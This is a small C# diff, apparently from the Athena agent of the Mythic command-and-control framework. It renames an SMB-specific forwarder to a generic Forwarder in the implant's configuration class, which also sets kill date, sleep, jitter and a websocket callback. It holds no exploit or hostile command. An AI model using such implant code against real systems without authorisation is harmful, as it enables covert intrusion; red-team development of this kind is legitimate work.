@@ -16,7 +16,7 @@ namespace Athena.Config
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SMBForwarder smbForwarder;
+        public Forwarder forwarder;
 
         public MythicConfig()
         {
@@ -28,7 +28,7 @@ namespace Athena.Config
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
-            this.smbForwarder = new SMBForwarder();
+            this.forwarder = new Forwarder();
         }
     }
 
